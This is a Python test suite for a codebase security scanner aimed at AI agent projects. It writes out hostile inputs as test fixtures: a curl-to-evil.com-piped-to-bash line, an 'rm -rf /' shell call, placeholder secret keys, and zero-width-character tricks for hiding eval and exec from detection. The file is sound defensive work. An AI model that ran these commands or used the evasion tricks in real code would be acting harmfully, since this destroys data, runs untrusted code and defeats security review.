"""Tests for the codebase scanner."""

from __future__ import annotations

import os
import tempfile
from pathlib import Path

import pytest

from agentsec.parser import AgentSecurityPolicy
from agentsec.scanner import scan_codebase


def _make_policy(**kwargs) -> AgentSecurityPolicy:
    """Create a minimal policy for testing."""
    defaults = {
        "name": "test-agent",
        "description": "Test agent",
        "security_tier": "standard",
        "version": "0.1",
    }
    defaults.update(kwargs)
    return AgentSecurityPolicy(**defaults)


class TestDangerousPatterns:
    def test_detect_eval(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "bad.py").write_text("result = eval(user_input)")
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("eval()" in f.message for f in result.findings)

    def test_detect_exec(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "bad.py").write_text("exec(code_string)")
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("exec()" in f.message for f in result.findings)

    def test_detect_os_system(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "bad.py").write_text("import os\nos.system('rm -rf /')")
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("os.system()" in f.message for f in result.findings)

    def test_detect_curl_pipe_bash(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "install.sh").write_text("curl https://evil.com | bash")
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("curl-pipe-to-shell" in f.message for f in result.findings)


class TestSecretDetection:
    def test_detect_api_key(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "config.py").write_text('API_KEY = "sk-1234567890abcdef1234567890"')
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("ASEC-021" in f.rule_id for f in result.findings)

    def test_detect_aws_key(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "config.py").write_text(
                'AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"'
            )
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("AWS" in f.message for f in result.findings)

    def test_detect_private_key(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "key.py").write_text(
                'KEY = "-----BEGIN RSA PRIVATE KEY-----\\nMIIE..."'
            )
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("Private key" in f.message for f in result.findings)

    def test_detect_google_api_key(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "config.py").write_text(
                'GOOGLE_API_KEY = "AIzaSyA1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6q"'
            )
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("Google API key" in f.message for f in result.findings)


class TestUndeclaredTools:
    def test_undeclared_subprocess(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "agent.py").write_text("import subprocess\nsubprocess.run(['ls'])")
            policy = _make_policy(tools=[{"name": "file_system", "permission": "read_only"}])
            result = scan_codebase(tmpdir, policy)
            assert any("Undeclared tool" in f.message for f in result.findings)

    def test_declared_tool_not_flagged(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "agent.py").write_text("import requests\nrequests.get('url')")
            policy = _make_policy(tools=[{"name": "http_client", "permission": "read_only"}])
            result = scan_codebase(tmpdir, policy)
            undeclared = [f for f in result.findings if "Undeclared tool" in f.message]
            assert len(undeclared) == 0

    def test_strict_tier_undeclared_is_high(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "agent.py").write_text("import boto3")
            policy = _make_policy(security_tier="strict")
            result = scan_codebase(tmpdir, policy)
            undeclared = [f for f in result.findings if "Undeclared tool" in f.message]
            assert all(f.severity == "high" for f in undeclared)

    def test_detect_gemini_import(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "agent.py").write_text(
                "import google.generativeai as genai\n"
                "genai.configure(api_key='x')\n"
            )
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("'gemini_api'" in f.message for f in result.findings)

    def test_llm_api_alias_not_flagged_for_provider_specific_import(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "agent.py").write_text("import openai\nclient = openai.OpenAI()")
            policy = _make_policy(tools=[{"name": "llm_api", "permission": "read_only"}])
            result = scan_codebase(tmpdir, policy)
            undeclared = [f for f in result.findings if "Undeclared tool" in f.message]
            assert len(undeclared) == 0


class TestIgnoreComments:
    def test_agentsec_ignore_suppresses_finding(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            code = "# agentsec-ignore: ASEC-020\nresult = eval(safe_input)"
            (Path(tmpdir) / "safe.py").write_text(code)
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            eval_findings = [f for f in result.findings if f.rule_id == "ASEC-020" and "safe.py" in f.message]
            assert len(eval_findings) == 0


class TestScanStats:
    def test_files_scanned_count(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "a.py").write_text("x = 1")
            (Path(tmpdir) / "b.py").write_text("y = 2")
            (Path(tmpdir) / "c.txt").write_text("not scanned")
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert result.files_scanned == 2  # only .py files

    def test_skip_node_modules(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            nm = Path(tmpdir) / "node_modules" / "pkg"
            nm.mkdir(parents=True)
            (nm / "bad.js").write_text("eval(x)")
            (Path(tmpdir) / "good.py").write_text("x = 1")
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert result.files_scanned == 1
            assert not any("node_modules" in f.file for f in result.findings)


# ─── Upgrade 1: Context-Aware exec() Pattern ─────────────────────────────

class TestExecFalsePositives:
    def test_exec_method_call_not_flagged(self):
        """JS regex.exec() should not be flagged as dangerous."""
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "parser.js").write_text(
                "const match = pattern.exec(str);\n"
                "const m2 = re.exec(text);\n"
            )
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            exec_findings = [f for f in result.findings if "exec()" in f.message]
            assert len(exec_findings) == 0

    def test_standalone_exec_still_flagged(self):
        """Python exec(code) should still be flagged."""
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "bad.py").write_text("exec(code_string)")
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("exec()" in f.message for f in result.findings)

    def test_regex_exec_in_ts_not_flagged(self):
        """TypeScript /regex/.exec(text) should not be flagged."""
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "utils.ts").write_text(
                "const m = /abc/.exec(text);\n"
                "const n = myRegex.exec(input);\n"
            )
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            exec_findings = [f for f in result.findings if "exec()" in f.message]
            assert len(exec_findings) == 0


# ─── Upgrade 2: .agentsecignore File Support ──────────────────────────────

class TestAgentsecIgnoreFile:
    def test_agentsecignore_skips_files(self):
        """Files matching .agentsecignore patterns should be skipped."""
        with tempfile.TemporaryDirectory() as tmpdir:
            vendor = Path(tmpdir) / "vendor"
            vendor.mkdir()
            (vendor / "lib.js").write_text("eval(x)")
            (Path(tmpdir) / ".agentsecignore").write_text("vendor/*\n")
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert not any("vendor" in f.file for f in result.findings)

    def test_agentsecignore_glob_pattern(self):
        """Glob patterns like *.generated.ts should work."""
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "schema.generated.ts").write_text("eval(x)")
            (Path(tmpdir) / "app.ts").write_text("eval(x)")
            (Path(tmpdir) / ".agentsecignore").write_text("*.generated.ts\n")
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert not any("generated" in f.file for f in result.findings)
            assert any("app.ts" in f.message for f in result.findings)

    def test_agentsecignore_comments_blank_lines(self):
        """Comments (#) and blank lines should be ignored."""
        with tempfile.TemporaryDirectory() as tmpdir:
            vendor = Path(tmpdir) / "vendor"
            vendor.mkdir()
            (vendor / "lib.js").write_text("eval(x)")
            (Path(tmpdir) / ".agentsecignore").write_text(
                "# This is a comment\n"
                "\n"
                "vendor/*\n"
                "\n"
                "# Another comment\n"
            )
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert not any("vendor" in f.file for f in result.findings)

    def test_no_agentsecignore_file(self):
        """Scanner works normally when .agentsecignore doesn't exist."""
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "bad.py").write_text("eval(x)")
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("eval()" in f.message for f in result.findings)


# ─── Upgrade 3: JavaScript/TypeScript Tool Detection ──────────────────────

class TestJSToolDetection:
    def test_detect_js_import_axios(self):
        """ES module import of axios should detect http_client."""
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "api.js").write_text('import axios from "axios";\n')
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert "http_client" in result.detected_tools

    def test_detect_js_require_fs(self):
        """CommonJS require of fs should detect file_system."""
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "server.js").write_text('const fs = require("fs");\n')
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert "file_system" in result.detected_tools

    def test_detect_ts_prisma(self):
        """TypeScript import of @prisma/client should detect database."""
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "db.ts").write_text(
                'import { PrismaClient } from "@prisma/client";\n'
            )
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert "database" in result.detected_tools

    def test_detect_js_child_process(self):
        """Import of child_process should detect shell_execution."""
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "runner.ts").write_text(
                'import { exec } from "child_process";\n'
            )
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert "shell_execution" in result.detected_tools

    def test_js_declared_tool_not_flagged(self):
        """Declared JS tools should not produce undeclared findings."""
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "db.js").write_text('const { Pool } = require("pg");\n')
            policy = _make_policy(tools=[{"name": "database", "permission": "read_only"}])
            result = scan_codebase(tmpdir, policy)
            undeclared = [f for f in result.findings if "Undeclared tool" in f.message]
            assert len(undeclared) == 0


# ─── Upgrade 4: Test File Awareness ───────────────────────────────────────

class TestTestFileAwareness:
    def test_secret_in_test_file_is_info(self):
        """Secrets in *.test.ts files should be severity 'info'."""
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "auth.test.ts").write_text(
                'const API_KEY = "sk-1234567890abcdef1234567890";\n'
            )
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            secret_findings = [f for f in result.findings if f.rule_id == "ASEC-021"]
            assert len(secret_findings) > 0
            assert all(f.severity == "info" for f in secret_findings)
            assert all("test file" in f.message for f in secret_findings)

    def test_secret_in_test_dir_is_info(self):
        """Secrets in __tests__/ directories should be severity 'info'."""
        with tempfile.TemporaryDirectory() as tmpdir:
            test_dir = Path(tmpdir) / "__tests__"
            test_dir.mkdir()
            (test_dir / "config.js").write_text(
                'const API_KEY = "sk-1234567890abcdef1234567890";\n'
            )
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            secret_findings = [f for f in result.findings if f.rule_id == "ASEC-021"]
            assert len(secret_findings) > 0
            assert all(f.severity == "info" for f in secret_findings)

    def test_secret_in_production_file_is_high(self):
        """Secrets in production files should remain severity 'high'."""
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "config.py").write_text(
                'API_KEY = "sk-1234567890abcdef1234567890"\n'
            )
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            secret_findings = [f for f in result.findings if f.rule_id == "ASEC-021"]
            assert len(secret_findings) > 0
            assert all(f.severity == "high" for f in secret_findings)

    def test_fixtures_dir_is_test_context(self):
        """Secrets in fixtures/ directories should be severity 'info'."""
        with tempfile.TemporaryDirectory() as tmpdir:
            fix_dir = Path(tmpdir) / "fixtures"
            fix_dir.mkdir()
            (fix_dir / "mock_data.json").write_text(
                '{"api_key": "sk-1234567890abcdef1234567890"}\n'
            )
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            secret_findings = [f for f in result.findings if f.rule_id == "ASEC-021"]
            assert len(secret_findings) > 0
            assert all(f.severity == "info" for f in secret_findings)


# ─── Red Team Fixes: Security Hardening Tests ─────────────────────────────

class TestAPIKeyRegexHyphens:
    """Red team fix: API key regex must match keys containing hyphens."""

    def test_api_key_with_hyphens_detected(self):
        """API keys containing hyphens should be detected (sk-proj-...)."""
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "config.py").write_text(
                'API_KEY = "sk-proj-abc123def456ghi789jkl012mno345"'
            )
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            secret_findings = [f for f in result.findings if f.rule_id == "ASEC-021"]
            assert len(secret_findings) > 0

    def test_anthropic_key_format_detected(self):
        """Anthropic API keys (sk-ant-api03-...) should be detected."""
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "config.py").write_text(
                'KEY = "sk-ant-api03-abcdefghijklmnopqrstuvwxyz1234567890"'
            )
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            secret_findings = [f for f in result.findings if f.rule_id == "ASEC-021"]
            assert len(secret_findings) > 0


class TestAgentsecIgnoreWildcard:
    """Red team fix: bare wildcard in .agentsecignore must not suppress all findings."""

    def test_bare_wildcard_rejected(self):
        """A bare '*' in .agentsecignore should not suppress findings."""
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "bad.py").write_text("eval(user_input)")
            (Path(tmpdir) / ".agentsecignore").write_text("*\n")
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("eval()" in f.message for f in result.findings)

    def test_double_star_wildcard_rejected(self):
        """A '**' in .agentsecignore should not suppress findings."""
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "bad.py").write_text("eval(user_input)")
            (Path(tmpdir) / ".agentsecignore").write_text("**\n")
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("eval()" in f.message for f in result.findings)

    def test_specific_pattern_still_works(self):
        """Specific patterns like 'vendor/*' should still work."""
        with tempfile.TemporaryDirectory() as tmpdir:
            vendor = Path(tmpdir) / "vendor"
            vendor.mkdir()
            (vendor / "lib.js").write_text("eval(x)")
            (Path(tmpdir) / "app.py").write_text("eval(x)")
            (Path(tmpdir) / ".agentsecignore").write_text("vendor/*\n")
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            # vendor file should be skipped, app.py should still be flagged
            assert not any("vendor" in f.file for f in result.findings)
            assert any("app.py" in f.message for f in result.findings)


class TestUnicodeBypass:
    """Red team fix: Unicode evasion techniques must be neutralized."""

    def test_zero_width_char_in_eval_detected(self):
        """eval() with zero-width character inserted should still be detected."""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Insert zero-width space between 'eval' and '('
            (Path(tmpdir) / "sneaky.py").write_text("eval\u200b(user_input)")
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("eval()" in f.message for f in result.findings)

    def test_zero_width_joiner_stripped(self):
        """Zero-width joiner in exec() should still be detected."""
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "sneaky.py").write_text("ex\u200dec(code)")
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("exec()" in f.message for f in result.findings)


class TestDynamicImportDetection:
    """Red team fix: importlib.import_module() must be detected."""

    def test_importlib_import_module_flagged(self):
        """importlib.import_module() should be flagged as dangerous."""
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "loader.py").write_text(
                "import importlib\n"
                "mod = importlib.import_module('subprocess')\n"
            )
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("importlib" in f.message for f in result.findings)

    def test_dunder_import_still_flagged(self):
        """__import__() should still be flagged."""
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "loader.py").write_text(
                "mod = __import__('os')\n"
            )
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("__import__" in f.message for f in result.findings)


class TestSymlinkProtection:
    """Red team fix: symlinks must be skipped to prevent infinite recursion."""

    def test_symlink_loop_does_not_crash(self):
        """A symlink loop should not cause infinite recursion."""
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir_path = Path(tmpdir)
            # Create a symlink loop: dir_a/link -> dir_a
            dir_a = tmpdir_path / "dir_a"
            dir_a.mkdir()
            (dir_a / "safe.py").write_text("x = 1")
            try:
                (dir_a / "loop").symlink_to(dir_a)
            except OSError:
                pytest.skip("Cannot create symlinks on this system")
            policy = _make_policy()
            # Should complete without hanging or crashing
            result = scan_codebase(tmpdir, policy)
            assert result.files_scanned >= 1

    def test_symlink_to_file_skipped(self):
        """Symlinked files should be skipped."""
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir_path = Path(tmpdir)
            (tmpdir_path / "real.py").write_text("eval(bad)")
            try:
                (tmpdir_path / "link.py").symlink_to(tmpdir_path / "real.py")
            except OSError:
                pytest.skip("Cannot create symlinks on this system")
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            # Only the real file should be scanned, not the symlink
            eval_findings = [f for f in result.findings if "eval()" in f.message]
            assert len(eval_findings) == 1
